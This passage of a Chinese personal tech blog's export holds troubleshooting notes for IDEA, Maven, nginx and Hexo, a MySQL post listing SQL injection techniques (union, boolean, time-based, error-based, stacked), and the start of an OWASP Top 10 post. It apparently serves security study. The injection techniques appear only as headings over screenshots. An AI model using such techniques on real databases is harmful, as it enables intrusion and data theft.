      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>git bash</title>
    <url>/2023/08/03/git/</url>
    <content><![CDATA[<h1 id="一、就是单纯没网了"><a href="#一、就是单纯没网了" class="headerlink" title="一、就是单纯没网了"></a>一、就是单纯没网了</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh: Could not resolve hostname github.com: Name or service not known</span><br><span class="line">fatal: Could not read from remote repository.</span><br><span class="line"></span><br><span class="line">Please make sure you have the correct access rights</span><br><span class="line">and the repository exists.</span><br><span class="line">FATAL Something&#x27;s wrong. Maybe you can find the solution here: https://hexo.io/docs/troubleshooting.html</span><br><span class="line">Error: Spawn failed</span><br><span class="line">    at ChildProcess.&lt;anonymous&gt; (E:\Myblog\node_modules\hexo-util\lib\spawn.js:51:21)</span><br><span class="line">    at ChildProcess.emit (node:events:513:28)</span><br><span class="line">    at cp.emit (E:\Myblog\node_modules\cross-spawn\lib\enoent.js:34:29)</span><br><span class="line">    at ChildProcess._handle.onexit (node:internal/child_process:291:12)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>git记录</tag>
      </tags>
  </entry>
  <entry>
    <title>开发问题收集</title>
    <url>/2023/08/14/idea/</url>
    <content><![CDATA[<h1 id="一、idea"><a href="#一、idea" class="headerlink" title="一、idea"></a>一、idea</h1><h2 id="1-pom-xml爆红"><a href="#1-pom-xml爆红" class="headerlink" title="1.pom.xml爆红"></a>1.pom.xml爆红</h2><p>选了type为：maven，依赖仅spring web;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Could not find artifact org.springframework.boot:spring-boot-starter-parent:pom:3.1.2.RELEASE in central (https://repo.maven.apache.org/maven2)</span><br><span class="line"></span><br><span class="line">Project &#x27;org.springframework.boot:spring-boot-starter-parent:3.1.2.RELEASE&#x27; not found </span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230817125715171.png"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230817151646560.png"></p>
<p>但是嘞，依旧没成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">No archetype found in remote catalog. Defaulting to internal catalog</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unable to reload maven project</span><br></pre></td></tr></table></figure>

<p>好好好，这么玩是吧</p>
<p>百度了之后，发现，我的IDEA是2020版本，而maven是3.8，算是最新版本，可能会出现不兼容情况</p>
<p>将环境变量路径改一下，然后maven设置改一下低版本的，重启下IDEA即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">expected START_TAG or END_TAG not TEXT (position: TEXT seen ...&lt;/dependency&gt;\r\n\r\n !---\u90ae\u4ef6\u53d1\u9001--&gt;\r\n &lt;d... @57:5)</span><br></pre></td></tr></table></figure>

<p>看看&lt;&#x2F;dependency&gt;标签有没有多余空格，换行有问题，格式之类的，注释的尖括号丢没丢之类的</p>
<p>所以内容是没问题，但多半是格式问题出错了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Could not transfer artifact org.springframework.boot:spring-boot-starter-data-redis:pom:$&#123;springboot. version&#125; from/to alimaven</span><br></pre></td></tr></table></figure>

<p>这个提示依旧很明显了，找到位置，将空格去掉</p>
<p>还剩下几个依赖确实安装不上</p>
<p>移动到project这个标签上，查看具体情况</p>
<p>反正，我还是有字符和括号的问题，删删改改就行了。最终完成了。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.IDEA版本与maven版本是否兼容</p>
<p>2.pom.xml文件中内容格式是否正确(标签是区分大小写的哈、符号啊、空格啊该删删，该改改)</p>
<h2 id="2-maven依赖全红"><a href="#2-maven依赖全红" class="headerlink" title="2.maven依赖全红"></a>2.maven依赖全红</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230817225322577.png"></p>
<p>刚处理完问题1，蹦出来这个</p>
<p>好好好</p>
<p>第二天打开，reload了maven，是好的</p>
<h2 id="3-jrebel热部署"><a href="#3-jrebel热部署" class="headerlink" title="3.jrebel热部署"></a>3.jrebel热部署</h2><p>对idea.properties文件设置后，打开idea</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">he IDE cannot create the directory.</span><br><span class="line">Possible reason: parent directory is read-only or the user lacks necessary permissions.</span><br><span class="line"></span><br><span class="line">If you have modified the &#x27;idea.config.path&#x27; property, please make sure it is correct,</span><br><span class="line">otherwise, please re-install the IDE.</span><br><span class="line"></span><br><span class="line">-----</span><br><span class="line">Location: C:\Program Files\JetBrains\.IntelliJ IDEA 2020.1.2\config</span><br><span class="line">java.nio.file.AccessDeniedException: C:\Program Files\JetBrains\.IntelliJ IDEA 2020.1.2</span><br></pre></td></tr></table></figure>

<p>要管理员方式打开</p>
<p>将解压得到的jrebel放入生成的<code>.JetBrains\.IntelliJ IDEA 2020.1.2\plugins</code>中</p>
<p>之后打开的idea就可以使用</p>
<p>激活jrebel ↓</p>
<p><a href="https://blog.csdn.net/zhuzbYR/article/details/111460716">https://blog.csdn.net/zhuzbYR/article/details/111460716</a></p>
<h2 id="4-jrebel-debug"><a href="#4-jrebel-debug" class="headerlink" title="4.jrebel debug"></a>4.jrebel debug</h2><p>Disconnected from the target VM, address: ‘127.0.0.1:64680’, transport: ‘socket’</p>
<p>法1：<code>netstat -ano|findstr xxxx</code></p>
<p>如果没有端口占用，不会显示；</p>
<p>如果该端口被占用，会有至少一个连接信息，一般找到是LISTENING的网络连接以及其后一列的进程号PID。<br>使用命令：tasklist|findstr 你找到的PID，从进程列表中查找包含指定字符串的进程。<br>使用命令：taskkill &#x2F;pid 你找到的PID -f，根据PID杀死进程</p>
<p>启动的VM参数太小导致JRebel检测不通过，直接终止本次启动，所以在Server config中补充VM Options即可</p>
<p>help-&gt;edit custom vm-&gt; 将参数改大点，比如我的VM options <code> -Djava.awt.headless=true -Xms2048m -Xmx2048m</code>，但是没用</p>
<p>与防火墙也没有关系</p>
<p>通过在logback中设置一下，打印出debug信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error starting ApplicationContext. To display the conditions report re-run your application with &#x27;debug&#x27; enabled.</span><br><span class="line">2023-08-18 14:01:07 [ERROR][org.springframework.boot.SpringApplication][reportFailure][819] - Application run failed</span><br><span class="line">org.springframework.beans.factory.BeanCreationException: Error creating bean with name &#x27;sqlSessionFactory&#x27; defined in class path resource [org/mybatis/spring/boot/autoconfigure/MybatisAutoConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.apache.ibatis.session.SqlSessionFactory]: Factory method &#x27;sqlSessionFactory&#x27; threw exception; nested exception is org.springframework.core.NestedIOException: Failed to parse mapping resource: &#x27;class path resource [com/cxs/allmodel/mapper]&#x27;; nested exception is java.io.FileNotFoundException: class path resource [com/cxs/allmodel/mapper] cannot be opened because it does not exist</span><br><span class="line">	at org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:658)</span><br><span class="line">	at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:638)</span><br><span class="line">	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1352)</span><br><span class="line">	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1195)</span><br><span class="line">	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:582)</span><br><span class="line">	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:542)</span><br><span class="line">	at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335)</span><br><span class="line">	at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234)</span><br><span class="line">	at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333)</span><br><span class="line">	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208)</span><br><span class="line">	at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:944)</span><br><span class="line">	at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:918)</span><br><span class="line">	at org.springframework.context.support.AbstractApplicationContext.__refresh(AbstractApplicationContext.java:583)</span><br><span class="line">	at org.springframework.context.support.AbstractApplicationContext.jrLockAndRefresh(AbstractApplicationContext.java:41002)</span><br><span class="line">	at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:42008)</span><br><span class="line">	at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:145)</span><br><span class="line">	at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:730)</span><br><span class="line">	at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:412)</span><br><span class="line">	at org.springframework.boot.SpringApplication.run(SpringApplication.java:302)</span><br><span class="line">	at org.springframework.boot.SpringApplication.run(SpringApplication.java:1301)</span><br><span class="line">	at org.springframework.boot.SpringApplication.run(SpringApplication.java:1290)</span><br><span class="line">	at com.easypan.Easypanapplication.main(Easypanapplication.java:16)</span><br><span class="line">Caused by: org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.apache.ibatis.session.SqlSessionFactory]: Factory method &#x27;sqlSessionFactory&#x27; threw exception; nested exception is org.springframework.core.NestedIOException: Failed to parse mapping resource: &#x27;class path resource [com/cxs/allmodel/mapper]&#x27;; nested exception is java.io.FileNotFoundException: class path resource [com/cxs/allmodel/mapper] cannot be opened because it does not exist</span><br><span class="line">	at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:185)</span><br><span class="line">	at org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:653)</span><br><span class="line">	... 21 common frames omitted</span><br><span class="line">Caused by: org.springframework.core.NestedIOException: Failed to parse mapping resource: &#x27;class path resource [com/cxs/allmodel/mapper]&#x27;; nested exception is java.io.FileNotFoundException: class path resource [com/cxs/allmodel/mapper] cannot be opened because it does not exist</span><br><span class="line">	at org.mybatis.spring.SqlSessionFactoryBean.buildSqlSessionFactory(SqlSessionFactoryBean.java:523)</span><br><span class="line">	at org.mybatis.spring.SqlSessionFactoryBean.afterPropertiesSet(SqlSessionFactoryBean.java:380)</span><br><span class="line">	at org.mybatis.spring.SqlSessionFactoryBean.getObject(SqlSessionFactoryBean.java:547)</span><br><span class="line">	at org.mybatis.spring.boot.autoconfigure.MybatisAutoConfiguration.sqlSessionFactory(MybatisAutoConfiguration.java:153)</span><br><span class="line">	at org.mybatis.spring.boot.autoconfigure.MybatisAutoConfiguration$$EnhancerBySpringCGLIB$$1.CGLIB$sqlSessionFactory$2(&lt;generated&gt;)</span><br><span class="line">	at org.mybatis.spring.boot.autoconfigure.MybatisAutoConfiguration$$EnhancerBySpringCGLIB$$1$$FastClassBySpringCGLIB$$1.invoke(&lt;generated&gt;)</span><br><span class="line">	at org.springframework.cglib.proxy.MethodProxy.invokeSuper(MethodProxy.java:244)</span><br><span class="line">	at org.springframework.context.annotation.ConfigurationClassEnhancer$BeanMethodInterceptor.intercept(ConfigurationClassEnhancer.java:331)</span><br><span class="line">	at org.mybatis.spring.boot.autoconfigure.MybatisAutoConfiguration$$EnhancerBySpringCGLIB$$1.sqlSessionFactory(&lt;generated&gt;)</span><br><span class="line">	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class="line">	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">	at java.lang.reflect.Method.invoke(Method.java:498)</span><br><span class="line">	at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:154)</span><br><span class="line">	... 22 common frames omitted</span><br><span class="line">Caused by: java.io.FileNotFoundException: class path resource [com/cxs/allmodel/mapper] cannot be opened because it does not exist</span><br><span class="line">	at org.springframework.core.io.ClassPathResource.getInputStream(ClassPathResource.java:199)</span><br><span class="line">	at org.mybatis.spring.SqlSessionFactoryBean.buildSqlSessionFactory(SqlSessionFactoryBean.java:519)</span><br><span class="line">	... 35 common frames omitted</span><br><span class="line">Disconnected from the target VM, address: &#x27;127.0.0.1:57842&#x27;, transport: &#x27;socket&#x27;</span><br><span class="line"></span><br><span class="line">Process finished with exit code 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>问题是由于无法找到名为 <code>com/cxs/allmodel/mapper</code> 的类路径资源导致的。这通常意味着 MyBatis 无法找到指定的 Mapper 接口和映射文件。当然，这和虚拟机连接失败没关系</p>
<p>但是最后再看了看，和MyBaits有关，但我目前仅仅是测试web是否成功，后来才知道application.properties中有和MyBaits有关的配置，但我实际上没有使用，给注释掉，终于成功啦！！！</p>
<p><a href="https://www.freesion.com/article/8686658191/">https://www.freesion.com/article/8686658191/</a></p>
<p><a href="http://t.csdn.cn/yFDJe">http://t.csdn.cn/yFDJe</a></p>
<p>发送GET请求到路径”&#x2F;test”时，该端点会返回字符串”test”作为响应</p>
<h2 id="5-文件夹爆红"><a href="#5-文件夹爆红" class="headerlink" title="5.文件夹爆红"></a>5.文件夹爆红</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@SpringBootApplication(scanBasePackages = &#123;&quot;com.easypan&quot;&#125;)</span><br></pre></td></tr></table></figure>

<p>easypan爆红，</p>
<p>这个就是命名包名为com.easypan的时候，它真的创建了一个文件夹为com.easypan；而不是自动创建com&#x2F;easypan；所以需要自己去将文件夹改一下</p>
<h2 id="6-用idea自带的database工具连接mysql时"><a href="#6-用idea自带的database工具连接mysql时" class="headerlink" title="6.用idea自带的database工具连接mysql时"></a>6.用idea自带的database工具连接mysql时</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Server returns invalid timezone. Need to set &#x27;serverTimezone&#x27; property.</span><br><span class="line">Set time zone</span><br></pre></td></tr></table></figure>

<p>因为安装的mysql驱动版本高了，是8.0的，改为5.1的吧</p>
<p>或在url后添加 <code>?serverTimezone=[GMT]</code></p>
<h2 id="7-Driver-class-‘com-mysql-cj-jdbc-Driver’-not-found"><a href="#7-Driver-class-‘com-mysql-cj-jdbc-Driver’-not-found" class="headerlink" title="7.Driver class ‘com.mysql.cj.jdbc.Driver’ not found"></a>7.Driver class ‘com.mysql.cj.jdbc.Driver’ not found</h2><p>com.mysql.jdbc.Driver是MySQL 5.x版本中的驱动程序类。它已经过时，不再被推荐使用，因为它不支持最新的JDBC规范，并且可能存在安全漏洞。</p>
<p>com.mysql.cj.jdbc.Driver是MySQL 8.0版本中的默认驱动程序类。它支持最新的JDBC规范，并提供更好的性能、扩展性和安全性。此外，它还包括了一些新特性，例如支持Unicode字符集和多语言处理等能。</p>
<p>所以我MySQL 5.7确实用不了cj的class</p>
<h2 id="8-plugins什么插件都搜不到"><a href="#8-plugins什么插件都搜不到" class="headerlink" title="8.plugins什么插件都搜不到"></a>8.plugins什么插件都搜不到</h2><p><a href="https://plugins.jetbrains.com/">https://plugins.jetbrains.com/</a></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230818210500627.png"></p>
<h1 id="二、vscode"><a href="#二、vscode" class="headerlink" title="二、vscode"></a>二、vscode</h1><h2 id="node-v，npm-v未识别"><a href="#node-v，npm-v未识别" class="headerlink" title="node -v，npm-v未识别"></a>node -v，npm-v未识别</h2><p>在vscode终端下使用node -v，npm-v未识别（但在cmd上是可以的，证明已配置了全局变量）</p>
<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>以管理员身份运行vscode</p>
<p><strong>但实际上，我只是重启了下vscode，就好了</strong></p>
<h1 id="三、nginx"><a href="#三、nginx" class="headerlink" title="三、nginx"></a>三、nginx</h1><p>配置详见 <a href="http://t.csdn.cn/zEQwv">http://t.csdn.cn/zEQwv</a></p>
<h2 id="1-配置后访问为404"><a href="#1-配置后访问为404" class="headerlink" title="1.配置后访问为404"></a>1.配置后访问为404</h2><p>nginx.conf配置为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">      listen       8000;#访问端口</span><br><span class="line">      #listen       somename:8080;</span><br><span class="line">      server_name  easypan.yuleiyun.com;</span><br><span class="line">charset utf-8;</span><br><span class="line"></span><br><span class="line">      location / &#123;  #路由规则</span><br><span class="line">	alias  D:/phpstudy_pro/WWW/sqli;</span><br><span class="line">          #root   html; #拼接</span><br><span class="line">          # root 和 alias 取其1即可</span><br><span class="line">          </span><br><span class="line">          index  index.html index.htm; #index 首页设置</span><br><span class="line">      &#125;</span><br><span class="line">location /api &#123;</span><br><span class="line">	#alias </span><br><span class="line">          proxy_pass http://localhost:7090/api;# 跨域访问</span><br><span class="line">	proxy_set_header x-forwarded-for $remote_addr;#客户端ip remote_addr</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>



<p><img src="/../../../Typora/img111/image-20230819122514363.png" alt="访问爆404"></p>
<h2 id="解决方案："><a href="#解决方案：" class="headerlink" title="解决方案："></a>解决方案：</h2><p><strong>反斜杠漏了啊</strong></p>
<p>​	alias  D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;sqli<code>/</code>; 不要丢最后一个反斜杠</p>
<p><img src="/../../../Typora/img111/image-20230819123728492.png"></p>
<h2 id="四、nodejs的冲突"><a href="#四、nodejs的冲突" class="headerlink" title="四、nodejs的冲突"></a>四、nodejs的冲突</h2><p>开发设计的时候要求node版本16.17</p>
<p>当时配置hexo的是v18.</p>
<p>使用旧版本的nodejs导致了hexo进行博客更新出问题，而且yaml格式还乱序了，G!!!!</p>
<p>好好好，这样玩是吧</p>
<h2 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h2><p>我就用旧的来，再装一遍吧 <code>npm install -g hexo-cli</code></p>
<h2 id="Please-make-sure-you-have-the-correct-access-rights-and-the-repository-exists"><a href="#Please-make-sure-you-have-the-correct-access-rights-and-the-repository-exists" class="headerlink" title="Please make sure you have the correct access rights and the repository exists."></a>Please make sure you have the correct access rights and the repository exists.</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Please make sure you have the correct access rights and the repository exists.</span><br><span class="line">FATAL Something&#x27;s wrong. Maybe you can find the solution here: https://hexo.io/docs/troubleshooting.html</span><br><span class="line">Error: Spawn failed</span><br><span class="line">    at ChildProcess.&lt;anonymous&gt; (E:\Myblog\node_modules\hexo-util\lib\spawn.js:51:21)</span><br><span class="line">    at ChildProcess.emit (node:events:513:28)</span><br><span class="line">    at ChildProcess.cp.emit (E:\Myblog\node_modules\cross-spawn\lib\enoent.js:34:29)</span><br><span class="line">    at Process.ChildProcess._handle.onexit (node:internal/child_process:291:12)</span><br></pre></td></tr></table></figure>

<p>是git服务器没有发现存储本地的ssh密钥</p>
<p>也就是说，删了一遍已安装的node.js，把公钥忘了呗</p>
<h3 id="解决方案-2"><a href="#解决方案-2" class="headerlink" title="解决方案"></a>解决方案</h3><p>$ git config user.name ，幸好，这些还记着的</p>
<p><code>$ ssh -T git@github.com</code></p>
<blockquote>
<p>ssh: connect to host github.com port 22: Connection  timed out</p>
</blockquote>
<p>重新生成ssh</p>
<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><h2 id="DAO-x2F-ENTITY-x2F-SERVICE-x2F-CONTROLLER"><a href="#DAO-x2F-ENTITY-x2F-SERVICE-x2F-CONTROLLER" class="headerlink" title="DAO&#x2F;ENTITY&#x2F;SERVICE&#x2F;CONTROLLER"></a>DAO&#x2F;ENTITY&#x2F;SERVICE&#x2F;CONTROLLER</h2><p>1、DAO层： 持久层 主要与数据库进行交互</p>
<p>DAO层主要是做数据持久层的工作，主要与数据库进行交互。</p>
<p>DAO层首先会创建DAO接口，接着就可以在模块中就可以调用DAO 的接口进行数据业务的而处理，并且不用关注此接口的具体实现类是哪一个类。DAO 层的数据源和数据库连接的参数都是在配置文件中进行配置的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">定义接口</span><br><span class="line">构造Entity的实例queryById</span><br><span class="line">声明增删改查的方法</span><br></pre></td></tr></table></figure>

<p>2、Entity层： 实体层 数据库在项目中的类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">实体类中，声明变量，一系列地get和set相应的变量</span><br></pre></td></tr></table></figure>

<p>3、Service层：业务层 控制业务</p>
<p>Service层主要负责业务模块的逻辑应用设计。和DAO层一样都是先设计放接口的类，再创建实现的类，然后在配置文件中进行配置其实现的关联。接下来就可以在service层调用接口进行业务逻辑应用的处理。</p>
<p>封装Service层的业务逻辑有利于业务逻辑的独立性和重复利用性。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先定义接口类</span><br><span class="line">构造主键的实例</span><br><span class="line">增删改查方法的声明</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">定义一个类实现上述接口</span><br><span class="line">定义Dao层的变量</span><br><span class="line">对接口增删改查的重写</span><br></pre></td></tr></table></figure>

<p>4、Controller层： 控制层 控制业务逻辑</p>
<p>Controller层负责具体的业务模块流程的控制，其实就是与前台互交，把前台传进来的参数进行处理，controller层主要调用Service层里面的接口控制具体的业务流程，控制的配置也需要在配置文件中进行。</p>
<p>5、View层： 此层与控制层结合比较紧密，需要二者结合起来协同工发。View层主要负责前台jsp页面的表示</p>
<p>Conroller层和Service层的区别是：Controlle层负责具体的业务模块流程的控制;Service层负责业务模块的逻辑应用设计;</p>
<p>总结：在具体的项目中，其流程为：Controller层调用Service层的方法，Service层调用Dao层中的方法，其中调用的参数是使用Entity层进行传递的。总的来说这样每层做什么的分类只是为了使业务逻辑更加清晰，写代码更加方便，所以有时候也需要根据具体情况来，但是大体的都是这样处理的，因为它其实就是提供一种规则，让你把相同类型的代码放在一起，这样就形成了层次，从而达到分层解耦、复用、便于测试和维护的目的。</p>
<p>————————————————<br>版权声明：本文为CSDN博主「吴沐珂」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/whz199511/article/details/81532593">https://blog.csdn.net/whz199511/article/details/81532593</a></p>
<h2 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h2><h3 id="关于root和alias还有-x2F"><a href="#关于root和alias还有-x2F" class="headerlink" title="关于root和alias还有&#x2F;"></a>关于root和alias还有&#x2F;</h3><p>nginx优先匹配&#x2F;多的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location /pic/&#123;</span><br><span class="line">         alias picture/pic/;</span><br><span class="line">     &#125;</span><br><span class="line"> location /pic/ps/&#123;</span><br><span class="line">         root picture;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<p>假如访问…&#x2F;pic&#x2F;ps&#x2F;1.jpg，优先匹配第二个，是<strong>root</strong>，则…<code>/picture</code>&#x2F;pic&#x2F;ps&#x2F;1.jpg，即<strong>在前面加上</strong></p>
<p>假如访问…&#x2F;pic&#x2F;1.jpg，匹配第一个，是<strong>alias</strong>，则…<code>/picture/pic</code>&#x2F;1.jpg，即<strong>直接替换</strong></p>
]]></content>
      <categories>
        <category>idea</category>
        <category>nginx</category>
        <category>vscode</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>idea</tag>
        <tag>nginx</tag>
        <tag>vscode</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql</title>
    <url>/2023/07/02/mysql/</url>
    <content><![CDATA[<p>show databases;</p>
<p>use [db];</p>
<p>show tables;</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230709212913793.png?token=AOTZUBUG2IIZQRKVATV6C5DEVK3GY"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230709212941324.png?token=AOTZUBTUAWV6BYLHJGOYP7LEVK4IK"></p>
<h2 id="布尔"><a href="#布尔" class="headerlink" title="布尔"></a>布尔</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230710112117709.png" alt="布尔"></p>
<p>&amp;&amp;和||也是支持的。</p>
<h3 id="延时"><a href="#延时" class="headerlink" title="延时"></a>延时</h3><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230709213414089.png?token=AOTZUBVB7UZJHSEV6NZTYJ3EVK4I2"></p>
<h3 id="引号"><a href="#引号" class="headerlink" title="引号"></a>引号</h3><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230709213029044.png?token=AOTZUBXIVMIZQBPL4LX5HL3EVK536"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230709213056348.png?token=AOTZUBQES5WE4RGAYH2AHADEVK54G" alt="image-20230709213056348"></p>
<h3 id="id不存在"><a href="#id不存在" class="headerlink" title="id不存在"></a>id不存在</h3><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230709213110367.png?token=AOTZUBUZCCAJWJCHW444I4LEVK544" alt="image-20230709213110367"></p>
<h3 id="id-与union-select"><a href="#id-与union-select" class="headerlink" title="id 与union select"></a>id 与union select</h3><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230709213238118.png?token=AOTZUBXSAVACGLI34SAUE6TEVK56M" alt="image-20230709213238118"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230709213126406.png?token=AOTZUBRSO6AJBS2JZJ5N3LLEVK57G" alt="image-20230709213126406"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230710111123221.png"></p>
<h3 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h3><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230709213206229.png?token=AOTZUBSYPY2SNTFUMSFI4ILEVK6QY" alt="image-20230709213206229"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230709214646554.png?token=AOTZUBR6LC3VMJL6GKPVAT3EVK6SI" alt="列名(username)排序"></p>
<h3 id="数字型基于种子排序"><a href="#数字型基于种子排序" class="headerlink" title="数字型基于种子排序"></a>数字型基于种子排序</h3><p>字符型注入是无变化滴。</p>
<p>用于盲注</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230709214811700.png?token=AOTZUBR2O36Z2LLIXHRYPVDEVK6SW" alt="rand"></p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230709213729241.png?token=AOTZUBTND4QKKC3QWJZRC23EVK6UA"></p>
<h3 id="limit-m-n"><a href="#limit-m-n" class="headerlink" title="limit m,n"></a>limit m,n</h3><p>m表示索引，从0开始，表示第一条记录；n表示取的记录数</p>
<p>从第m+1条开始，取n条</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230709214921210.png?token=AOTZUBTZVS24PKTYJM5N7N3EVK6UY"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230709215047272.png?token=AOTZUBXXX4F3LSAJD366LWDEVK62C"></p>
<h3 id="concat与group-concat"><a href="#concat与group-concat" class="headerlink" title="concat与group_concat"></a>concat与group_concat</h3><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230709215950644.png?token=AOTZUBSVDH6DYICPEPM2SUTEVK6ZW"></p>
<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230709221642326.png" alt="注释代替空格"></p>
<h3 id="堆叠"><a href="#堆叠" class="headerlink" title="堆叠"></a>堆叠</h3><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230710111855619.png" alt=";"></p>
<h3 id="空字节"><a href="#空字节" class="headerlink" title="空字节"></a>空字节</h3><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230710112020309.png"></p>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>owasp top10</title>
    <url>/2023/05/13/owasp-top10%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="1-失效的访问控制"><a href="#1-失效的访问控制" class="headerlink" title="1.失效的访问控制"></a>1.失效的访问控制</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>访问控制:即保护资源不被非法访问和使用，目前应用最多的是<strong>基于角色的访问控制机制</strong>。</p>
<p>失效的访问控制就是攻击者通过各种手段<strong>提升自己的权限，越过访问控制，使访问控制失效</strong>，这样攻击者就可以<strong>冒充</strong>用户、管理员或拥有特权的用户，或者创建、访问、更新或删除任何记录。</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><blockquote>
